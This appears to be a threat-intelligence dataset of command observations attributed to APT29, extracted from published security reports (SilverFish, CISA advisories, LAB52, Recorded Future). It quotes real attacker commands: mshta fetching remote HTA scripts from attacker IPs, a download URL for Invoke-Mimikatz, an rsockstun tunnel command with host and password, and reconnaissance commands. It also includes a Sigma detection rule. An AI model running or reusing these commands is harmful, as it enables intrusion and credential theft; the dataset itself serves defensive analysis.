1.0.0,actor--apt29,artifact--sha256:efe192cd92931ed897dd4e90d9a595c2e1a0e2024f7209e7733cd350d992b405,observation--sha256:811a4ced46869134f9b32542a48e73dc962ec74a94e93e2a26f9020244814de8,command,came across another Powershell stub that decodes another BASE64 encoded payload using,came across another Powershell stub that decodes another BASE64 encoded payload using,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 29}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group 3.4.1 NetSupport Remote Control During the analysis made on the C&C server contents, PTI team was able to gather the buildus9_3.ps1 and build_eu.ps1 files that are uploaded to detection sandbox panel which is explained in section 3.4. At first glance, PTI team observed that the files are heavily obfuscated and the main payload is encrypted using AES encryption. Figure 33. Encoded contents of buildus9_3.ps1 file After de-obfuscating and extracting the decrypted payl",
1.0.0,actor--apt29,artifact--sha256:2f51111ad5e2b9ed50d0a043b66f03ac695723b264802b053c46c2d9da806584,observation--sha256:f2a3dfbc63f7be30b26063514972c2fa77a6e38fdf74c81e7c8f2210232442ad,command,"cases PowerSploit and Mimikatz post exploitation Powershell scripts. Additionally, there are","cases PowerSploit and Mimikatz post exploitation Powershell scripts. Additionally, there are",candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 20}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Depending on the analysis made on the TDS panel, the PTI Team believes that the traffic distribution is achieved by injecting the following malicious PHP and JavaScript codes into multiple legitimate websites. Injected code checks the host, referrer, and cookie headers for the expected values on every incoming request and sends an HTTP GET request to the hxxp://mwkh.adsprofitnetwork.com/wordpressComposerUpdate ?phpcid=250&php address by appending the &hn=%URL-ENCOD",
1.0.0,actor--apt29,artifact--sha256:d0bcb236854daf7a6bf744d721b36925398f3b7c8dee43a4c9b0d9c99ebf76b0,observation--sha256:d1f9e5fb2831ed8f1364a35873e24910baec94b3bb1c27a8affef5b40a47d8bc,command,client32.ini configuration files from buildus9_3.ps1 and build_eu.ps1 Powershell scripts.,client32.ini configuration files from buildus9_3.ps1 and build_eu.ps1 Powershell scripts,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 30}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Figure 35. Contents of the extracted ZIP file Amoung the extracted ZIP file contents, client32.ini file contains the necessary configuration settings for NetSupportManager remote access software. PTI Team extracted the both client32.ini configuration files from buildus9_3.ps1 and build_eu.ps1 Powershell scripts. Extracted INI files contains a HTTP field that includes gateway and secondary gateway address values. Figure 36. Extracted client32.ini file for buildus9_3",
1.0.0,actor--apt29,artifact--sha256:419c4f796e964254425675822daead5dae302453ccde5e74c46f401732133cbe,observation--sha256:1348c94cfc54cebf2f7cc58f39e7e8f61e1e0a33af5c5bce7d0f0a5a5e2458e7,command,<command> : %SystemRoot%\System32\cmd.exe /c “ping 127 .0.0.1 -n 30,command> : %SystemRoot%\System32\cmd.exe /c “ping 127 .0.0.1 -n 30,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 100}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5299 If Subkey 6 does not exist, the function returns a default value with the following fields: <iteration> : Value between 5 and 20 (depending on each sample) <id> : 0 <command> : %SystemRoot%\System32\cmd.exe /c “ping 127 .0.0.1 -n 30 & del /F “%PROCESSOR_IDENTIFIER%” <EnvironmentVariableExpanded> : $(PROCESSOR_IDENTIFIER) <EnvironmentVariable> : PROCESSOR_IDENTFIER This command returns the Accept and User-Agent headers in the result. 3.4.3.4 GET HEADERS Illustration 94. GET HEAD",
1.0.0,actor--apt29,artifact--sha256:08325be1057566e743407a5dbf52a0398b180f7100170dd6ef4b3f0294a792fe,observation--sha256:f430a5990c67a06035c9740a34e7ae914b6c2c7eb8d0564cd8ce8775208c1ec5,command,commands contains another Powershell loader script. The second stage script extracts the,commands contains another Powershell loader script. The second stage script extracts the,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 25}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group 3.3.3 Cobalt Strike & Empire Beacons During the post-exploitation analysis, the PTI Team identified several encoded/obfuscated Powershell commands for loading Cobalt Strike and Empire beacon payloads. Almost all of the Cobalt Strike payloads are executed with compressed and encoded Powershell commands. The decoded and decompressed Powershell commands contains another Powershell loader script. The second stage script extracts the BASE64 Cobalt Strike beacon payload ",
1.0.0,actor--apt29,artifact--sha256:405eb50be3d00b7a0114a1962bee87d518eef566e36cf939dddfe77bd7845b71,observation--sha256:346816356774ee929bc26c20c71722a84bf1432acfa3ff408290a5fec6919856,command,"compressed Powershell commands. After de-obfuscating the Empire agent loader, the PTI","compressed Powershell commands. After de-obfuscating the Empire agent loader, the PTI",candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 27}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group The PTI Team was able to analyze one of the Empire agents used by the SilverFish group. As with Cobalt Strike beacons, Empire agent loaders are executed with encoded and compressed Powershell commands. After de-obfuscating the Empire agent loader, the PTI Team extracted the https://149 .154.157 .248:443C&C address. Figure 30. Decoded Empire agent code 3.4 VictimTotal Sandbox One of the most shocking discoveries of the PTI Team was a web panel for testing the malici",
1.0.0,actor--apt29,artifact--sha256:f417e23ef3f2fdccac444552b08cf8e32beadbe83f931933a986f6813c08a50d,observation--sha256:6ce86067f8815b7eb55e56071a708499745b2fedeb3663fd6b610293ac5d83f9,command,description: Service or Drive enumeration via powershell,description: Service or Drive enumeration via powershell,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 16 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'pass' - 'connect' condition: selection falsepositives: legitimate use of rsockstun or software with exact same arguments title: Service or Drive enumeration via powershell description: Service or Drive enumeration via powershell author: references: date: 2023/11/15 logsource: category: ps_script product: wind,
1.0.0,actor--apt29,artifact--sha256:dc2412b4d75233658b279d291b14ad1937f5eccf969c8a1f1f4e9b947c28e859,observation--sha256:6025ae14bf0e4a79860095375bbf6df23fd915699c175f5e0bec028784c8e59a,command,encoded PowerShell.,encoded PowerShell,candidate,,unknown,unknown,not-stated,,source--apt29--186bc843f9cfc077,APT29/AA21-116A_Russian_Foreign_Intelligence_Service_Cyber_Operations_508C.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"FBI | DHS | CISA TLP:WHITE Page 4 of 5 | Product ID: AA21-116A TLP: WHITE 19 vaccine development. The FBI’s investigation revealed that following initial compromise of a network—normally through an unpatched, publicly -known vulnerability—the actors deployed WELLMESS. Once on the network, the actors targeted each organization’s vaccine research repository and Active Directory servers. These intrusions, which mostly relied on targeting on- premises network resources, were a departure from histori",
1.0.0,actor--apt29,artifact--sha256:5827893e9ad7b3f19516b4b7920e090ea48d189221ecbffb25def38083f89f6c,observation--sha256:4c20fb5a3110de1f88f9a236bafdda7cb7fdf1b03badd01b0294952d77c80a41,command,encoded/obfuscated Powershell commands for loading Cobalt Strike and Empire,encoded/obfuscated Powershell commands for loading Cobalt Strike and Empire,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 25}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group 3.3.3 Cobalt Strike & Empire Beacons During the post-exploitation analysis, the PTI Team identified several encoded/obfuscated Powershell commands for loading Cobalt Strike and Empire beacon payloads. Almost all of the Cobalt Strike payloads are executed with compressed and encoded Powershell commands. The decoded and decompressed Powershell commands contains another Powershell loader script. The second stage script extracts the BASE64 Cobalt Strike beacon payload ",
1.0.0,actor--apt29,artifact--sha256:47e40db4db2f826f515c08271efbbbca67c45fcfd4f159aced685357c8bc6d06,observation--sha256:52b887f7ab2bad286fdbf3e7c28861b051aa5576992c29949cf80a3e432a4664,command,"lots of specially crafted Powershell, BAT , CSPROJ, JavaScript and HTA files that are mainly","lots of specially crafted Powershell, BAT , CSPROJ, JavaScript and HTA files that are mainly",candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 20}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Depending on the analysis made on the TDS panel, the PTI Team believes that the traffic distribution is achieved by injecting the following malicious PHP and JavaScript codes into multiple legitimate websites. Injected code checks the host, referrer, and cookie headers for the expected values on every incoming request and sends an HTTP GET request to the hxxp://mwkh.adsprofitnetwork.com/wordpressComposerUpdate ?phpcid=250&php address by appending the &hn=%URL-ENCOD",
1.0.0,actor--apt29,artifact--sha256:064abab2144db9fcef348a77430a2d5582a0e0135c08d970467a35a547b0b00c,observation--sha256:8d6f1a4ace4f53a10b1dc55a736135172e771f11def64cbed0e5b36039912213,command,raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1,raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 45}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group 6.9 Javascript Injection Points jenkins.findfwd.com/sk-jspark_init.php test.directfwd.com/sk-jspark_init.php securesearchnow.com/sk-jspark_init.php alertmeter.info/sk-jspark_init.php freeresultsguide.com/sk-jspark_init.php 6.10 External Post-Exploitation Scripts 141.136.0.4/46tt83y6.ps1 173.232.146.12/Invoke-SocksProxy.psm1 176.10.118.136/pwrvw.ps1 179.43.141.188:80/46tt83y6.ps1 179.43.141.188:81/46tt83y6.ps1 179.43.141.188:82/46tt83y6.ps1 179.43.141.188:83/46tt83y,
1.0.0,actor--apt29,artifact--sha256:1cbe4cbcafcb265881ea469dd5debc1064b026b0ed8ea56714bf70f911adb815,observation--sha256:bf6661b9ea1a70e3e4bec4885430e5590a3c6a5032143e24ac999a6dba71f112,command,"returned, powershell required + console shown. if failed, needs manual reg cleanup","returned, powershell required + console shown. if failed, needs manual reg cleanup",candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 13}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Spawn new shell session (port 143) Spawn new shell session (port 443) (+amsi.dll patch WIN10 ONLY) Spawn new shell session (port 443) (+amsiInitFailed=true WIN10 ONLY) TEST Spawn new bot instance Spawn new bot instance elevated (slui, build>=9600, WIN8.1, WIN10) powershell required + console shown. Blocked by WD Spawn new bot instance elevated (eventvwr, WIN7, WIN8.1) Spawn new bot instance elevated (sdclt, build>=14393, WIN10) WD alert, instance dies, still works ",
1.0.0,actor--apt29,artifact--sha256:27be3fc5a3e1bbfc0597e0dfc3422237b719356a88c70f97d7aaa0d8f4f428f3,observation--sha256:e21e8d3c3d5a29b7045233738bcb296aae56e400f1b439d256272f1d1b905416,command,rundll32 C:\Windows\system32\AclNumsInvertHost.dll AclNumsInvertHost,rundll32 C:\Windows\system32\AclNumsInvertHost.dll AclNumsInvertHost,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 7 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  Get-NetComputer  Get-NetGroup  Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount""  Get-NetDiDomain  Get-AdUser  Get-DomainUser -UserName  Get-NetUser -PreauthNotRequire  Get-NetComputer | select samaccountname  Get-NetUser -SPN | select serviceprincipalname Tunneling into Compromised Environments In selected environments the SVR used an ad",
1.0.0,actor--apt29,artifact--sha256:358461d2e28eb32db4ba4733041f83bf5c72e46403f67a17c07db0d3418a9fd0,observation--sha256:71322ef49fe798cd6a1f891ab716cc91ef43b21703f951d6a7938149237a5a1c,command,title: Service or Drive enumeration via powershell,title: Service or Drive enumeration via powershell,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 16 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'pass' - 'connect' condition: selection falsepositives: legitimate use of rsockstun or software with exact same arguments title: Service or Drive enumeration via powershell description: Service or Drive enumeration via powershell author: references: date: 2023/11/15 logsource: category: ps_script product: wind,
1.0.0,actor--apt29,artifact--sha256:e74bca923917db14d612d28755f85f25d64fb60f106cf98ba4b8fd3d5aeebed9,observation--sha256:fd4364fbfab1615a6074e0197cd1f4309bb4ae1f3f9864ff1bdd2f13b1f67ca2,command,wmic process call create,wmic process call create,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 13 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR Windows Management Instrumentation T1047 SVR cyber actors executed Rsockstun either in memory or using Windows Management Instrumentation (WMI) to execute malicious commands and payloads. wmic process call create ""C:\Program Files\Windows Defender Advanced Threat Protection\Sense.exe -connect poetpages.com -pass M554- 0sddsf2@34232fsl45t31"" Table 10: SVR Cyber Actors ATT&CK Techniques for Enterprise: Command and ",
1.0.0,actor--apt29,artifact--sha256:16ff9de4fe425ed82c09cb1fa253865b2472c87c572609ce3d2882ca79ea5fdb,observation--sha256:76af0c1c264e216c93a3670b8ea8ec1ef1a747cfde94ebf4c0bde9aa2b5e22ed,command,• Monitor the network for evidence of encoded PowerShell commands and execution of network,• Monitor the network for evidence of encoded PowerShell commands and execution of network,candidate,,unknown,unknown,not-stated,,source--apt29--186bc843f9cfc077,APT29/AA21-116A_Russian_Foreign_Intelligence_Service_Cyber_Operations_508C.pdf,"{""page"": 3}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"FBI | DHS | CISA TLP:WHITE Page 3 of 5 | Product ID: AA21-116A TLP: WHITE • Where possible, enforce the use of strong passwords and prevent the use of easily guessed or commonly used passwords through technical means, especially for administrative accounts. • Regularly review the organization’s password management program. • Ensure the organization’s information technology (IT) support team has well-documented standard operating procedures for password resets of user account lockouts. • Maintain",
1.0.0,actor--apt29,artifact--sha256:7ee273654653d79397c70990264448cab3d0c360bcfbff48398b7873c46c228d,observation--sha256:c9369c6ec2de7fad4a4b9429bd990cab67e56c9ad59f717e236680cb0d5b556f,command,• mshta hxxp://104.128.228.76:9999/PAf3W,• mshta http://104.128.228.76:9999/PAf3W,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 23}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group During the analysis of executed commands the PTI team discovered multiple uses of mshta utility for executing external HTA scripts. The following list contains every external IP address that is used for executing HTA code. • mshta hxxp://104.128.228.76:9999/PAf3W • mshta hxxp://149 .154.157 .248:21/KDnbc • mshta hxxp://149 .154.157 .248:443/HRNrz • mshta hxxp://149 .154.157 .248:443/HRNrz • mshta hxxp://149 .154.157 .248:443/veUlx • mshta hxxp://149 .154.157 .248:4,
1.0.0,actor--apt29,artifact--sha256:85c5b986ca4ab3c4a31b425721c473d5452fd511611ce2facfc8cdbcc8099114,observation--sha256:e38c793406ba56e8b7660012fc34c2cbe964597900e8e9bd8d41f0d973addb51,command,• mshta hxxp://149 .154.157 .248:21/KDnbc,• mshta http://149 .154.157 .248:21/KDnbc,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 23}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group During the analysis of executed commands the PTI team discovered multiple uses of mshta utility for executing external HTA scripts. The following list contains every external IP address that is used for executing HTA code. • mshta hxxp://104.128.228.76:9999/PAf3W • mshta hxxp://149 .154.157 .248:21/KDnbc • mshta hxxp://149 .154.157 .248:443/HRNrz • mshta hxxp://149 .154.157 .248:443/HRNrz • mshta hxxp://149 .154.157 .248:443/veUlx • mshta hxxp://149 .154.157 .248:4,
1.0.0,actor--apt29,artifact--sha256:399f23d007ed6833465a187e1a36d3bfd6ebb53c2be16f72695eb8372d7a08af,observation--sha256:646dccfb91dabe742951ec1273081b6dd2618905da0369d1a15b75a1faa2cfb0,command,• mshta hxxp://149 .154.157 .248:443/HRNrz,• mshta http://149 .154.157 .248:443/HRNrz,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 23}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group During the analysis of executed commands the PTI team discovered multiple uses of mshta utility for executing external HTA scripts. The following list contains every external IP address that is used for executing HTA code. • mshta hxxp://104.128.228.76:9999/PAf3W • mshta hxxp://149 .154.157 .248:21/KDnbc • mshta hxxp://149 .154.157 .248:443/HRNrz • mshta hxxp://149 .154.157 .248:443/HRNrz • mshta hxxp://149 .154.157 .248:443/veUlx • mshta hxxp://149 .154.157 .248:4,
1.0.0,actor--apt29,artifact--sha256:72eed341ed52fbe9b9a8d60f3d58882aa5c052e42bf648016bba4d38dd688691,observation--sha256:0af8834114c9c2622af6a014a674d8af6a72a4be3311b057dee15738f2f79823,command,• mshta hxxp://149 .154.157 .248:443/veUlx,• mshta http://149 .154.157 .248:443/veUlx,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 23}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group During the analysis of executed commands the PTI team discovered multiple uses of mshta utility for executing external HTA scripts. The following list contains every external IP address that is used for executing HTA code. • mshta hxxp://104.128.228.76:9999/PAf3W • mshta hxxp://149 .154.157 .248:21/KDnbc • mshta hxxp://149 .154.157 .248:443/HRNrz • mshta hxxp://149 .154.157 .248:443/HRNrz • mshta hxxp://149 .154.157 .248:443/veUlx • mshta hxxp://149 .154.157 .248:4,
1.0.0,actor--apt29,artifact--sha256:b4cd632e156333e10541461bdd9a70350ea411c7d449b60b708354ace71780b7,observation--sha256:0cc735e15ad91f4e75c6e0e9552cbb498d5fa8b0c0f8652d6e747fdffd71156d,command,• mshta hxxp://149 .154.157 .248:445/SlaMn,• mshta http://149 .154.157 .248:445/SlaMn,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 23}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group During the analysis of executed commands the PTI team discovered multiple uses of mshta utility for executing external HTA scripts. The following list contains every external IP address that is used for executing HTA code. • mshta hxxp://104.128.228.76:9999/PAf3W • mshta hxxp://149 .154.157 .248:21/KDnbc • mshta hxxp://149 .154.157 .248:443/HRNrz • mshta hxxp://149 .154.157 .248:443/HRNrz • mshta hxxp://149 .154.157 .248:443/veUlx • mshta hxxp://149 .154.157 .248:4,
1.0.0,actor--apt29,artifact--sha256:61320c518988082d9a252ee32bb7b7e8910ffeb281e887f40e889a57889c4a81,observation--sha256:c37512f334f5c4a0a6b7e9169bff58e0ae11a8165a7e1e4e36043f6404dfe784,command,• mshta hxxp://149 .154.157 .248:80/SlaMn,• mshta http://149 .154.157 .248:80/SlaMn,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 23}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group During the analysis of executed commands the PTI team discovered multiple uses of mshta utility for executing external HTA scripts. The following list contains every external IP address that is used for executing HTA code. • mshta hxxp://104.128.228.76:9999/PAf3W • mshta hxxp://149 .154.157 .248:21/KDnbc • mshta hxxp://149 .154.157 .248:443/HRNrz • mshta hxxp://149 .154.157 .248:443/HRNrz • mshta hxxp://149 .154.157 .248:443/veUlx • mshta hxxp://149 .154.157 .248:4,
1.0.0,actor--apt29,artifact--sha256:01d2f0c90f9702a78afb072e34af701099f7ed5ad2c23a26cf4d9db99819573d,observation--sha256:1c70d0245648d4f2d8b32df700bcbd1c22e15f1a8c6bbd518f97131ff20a54c2,command,• mshta hxxp://149 .154.157 .248:8080/KDnbc,• mshta http://149 .154.157 .248:8080/KDnbc,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 23}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group During the analysis of executed commands the PTI team discovered multiple uses of mshta utility for executing external HTA scripts. The following list contains every external IP address that is used for executing HTA code. • mshta hxxp://104.128.228.76:9999/PAf3W • mshta hxxp://149 .154.157 .248:21/KDnbc • mshta hxxp://149 .154.157 .248:443/HRNrz • mshta hxxp://149 .154.157 .248:443/HRNrz • mshta hxxp://149 .154.157 .248:443/veUlx • mshta hxxp://149 .154.157 .248:4,
1.0.0,actor--apt29,artifact--sha256:890bd7d5647264121d1e03028660b5b4694de6b469f706964d84ce897e854b20,observation--sha256:13394a7f15c4ddf99e3cc92880311e7c9a9fc74a5b8b978f5bfcef391fe900ba,command,• mshta hxxp://149 .154.157 .248:8080/SlaMn,• mshta http://149 .154.157 .248:8080/SlaMn,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 23}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group During the analysis of executed commands the PTI team discovered multiple uses of mshta utility for executing external HTA scripts. The following list contains every external IP address that is used for executing HTA code. • mshta hxxp://104.128.228.76:9999/PAf3W • mshta hxxp://149 .154.157 .248:21/KDnbc • mshta hxxp://149 .154.157 .248:443/HRNrz • mshta hxxp://149 .154.157 .248:443/HRNrz • mshta hxxp://149 .154.157 .248:443/veUlx • mshta hxxp://149 .154.157 .248:4,
1.0.0,actor--apt29,artifact--sha256:2d7a022def516fd8b7aa6336398eee4b59cb84135e3a4c787ea5f7596ac1921a,observation--sha256:9afc9f2fac5453f4bb425f88ef1a9eff3e9bfca14ce87ed90cac78966a657dd0,command,• powershell,• powershell,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 9 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR Table 2: SVR Cyber Actors’ ATT&CK Techniques for Enterprise – Initial Access Technique Title ID Use Exploit Public-Facing Application T1190 SVR cyber actors exploit internet- connected JetBrains TeamCity server using CVE-2023-42793 for initial access. Table 3: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Execution Techniqu e Title ID Use Comman d and Scripting Interprete r: PowerSh ell T1059.0 01 SVR cyber ,
1.0.0,actor--apt29,artifact--sha256:772a32c146817de8b8e256c4cb62bcc9ddc8756155c114ba076ecb810ef83c26,observation--sha256:5c0f8193b9de8804d5693f53eabc46cbe11a86e962dae02b499b2bbf5a1b37ad,command,• powershell Get-WindowsDriver -Online -All,• powershell Get-WindowsDriver -Online -All,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 9 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR Table 2: SVR Cyber Actors’ ATT&CK Techniques for Enterprise – Initial Access Technique Title ID Use Exploit Public-Facing Application T1190 SVR cyber actors exploit internet- connected JetBrains TeamCity server using CVE-2023-42793 for initial access. Table 3: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Execution Techniqu e Title ID Use Comman d and Scripting Interprete r: PowerSh ell T1059.0 01 SVR cyber ,
1.0.0,actor--apt29,artifact--sha256:b5b52f63ebcbd12aaf1db9fc2e7333dc4a3eac28d4811ec16df17c8c3fce02d6,observation--sha256:45ad0c1a077e6167eee0509851c3beaaf0dc63570eae041da02bb422aa5eaa76,command,• powershell Get-WmiObject -Class Win32_Service -Computername,• powershell Get-WmiObject -Class Win32_Service -Computername,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 9 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR Table 2: SVR Cyber Actors’ ATT&CK Techniques for Enterprise – Initial Access Technique Title ID Use Exploit Public-Facing Application T1190 SVR cyber actors exploit internet- connected JetBrains TeamCity server using CVE-2023-42793 for initial access. Table 3: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Execution Techniqu e Title ID Use Comman d and Scripting Interprete r: PowerSh ell T1059.0 01 SVR cyber ,
1.0.0,actor--apt29,artifact--sha256:9b53036bc02256b658581f516f05fc4848a0048a18506aeb78e81ced30e329bc,observation--sha256:48dc9c6616b58a3926f889694a24616ea4e3999478d0dd35cb6debcd7cecba61,command,"● cmd.exe /C ""chcp 65001 > NUL & whoami""● cmd.exe /C ""chcp 65001 > NUL & wmic datafile whereName=""C:\Windows\System32\ntoskrnl.exe"" get Version”● cmd.exe /C ""chcp 65001 > NUL & netstat -a""● cmd.exe /C ""chcp 65001 > NUL & tasklist","● cmd.exe /C ""chcp 65001 > NUL & whoami""● cmd.exe /C ""chcp 65001 > NUL & wmic datafile whereName=""C:\Windows\System32\ntoskrnl.exe"" get Version”● cmd.exe /C ""chcp 65001 > NUL & netstat -a""● cmd.exe /C ""chcp 65001 > NUL & tasklist",candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS| RUSSIA Figure8: Refreshtokenrequest madebyGraphicalProton Source: RecordedFuture) After obtaininganewtoken, awordlist isusedtocreatearandomlynameddirectoryunder theOneDriveaccount’sApp\Teams_Test folder. Next, 2randomlynamedsubdirectoriesarecreatedtocontainC2communicationstoandfromthevictim. GraphicalProtonthengathersthevictim’ssysteminformation—includingtheir username, computer name, Windowsversion, networkconnections, andalist of runningprocesses—byrunningthefollowingcomma",
1.0.0,actor--apt29,artifact--sha256:ebd5101ce08b4615b6ce091e7ab2fd7c3a8215b7f599ab5bcb995fedf115c22f,observation--sha256:696abbf190461c7e73a8f3213780f3d34177d641d6768b3c299cfe7ee4ea7701,command," powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties"," powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties",candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
